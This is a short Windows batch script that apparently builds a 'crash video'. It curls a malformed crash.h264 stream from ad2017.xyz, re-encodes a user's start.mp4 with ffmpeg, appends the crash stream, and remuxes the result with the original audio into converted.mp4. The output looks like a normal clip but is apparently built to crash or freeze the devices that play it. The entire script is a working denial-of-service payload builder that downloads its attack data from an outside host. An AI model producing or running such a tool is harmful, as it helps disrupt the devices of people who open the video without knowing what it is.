@echo off

del converted.mp4
del converted_noaudio.mp4

echo Downloading crash.h264
curl https://ad2017.xyz/s/crash.h264 --output crash.h264
echo Getting the raw h.264 stream from start.mp4
ffmpeg -i start.mp4 -vf scale=800:800 -pix_fmt yuv411p -aspect 1 -r 30 start.h264
echo Extracting the audio from start.mp4
ffmpeg -i start.mp4 audio.mp3 
echo Concatenating the 2 streams
copy /b start.h264+crash.h264 raw.h264
echo Finishing the video
ffmpeg -i raw.h264 -c copy -metadata title="ad2017.xyz/crash" -pix_fmt yuv420p converted_noaudio.mp4
ffmpeg -i converted_noaudio.mp4 -i audio.mp3 -c copy -map 0:v -map 1:a -metadata title="ad2017.xyz/crash" -pix_fmt yuv420p converted.mp4
echo Created.

del crash.h264
del start.h264
del audio.mp3
del raw.h264
#del converted_noaudio.mp4




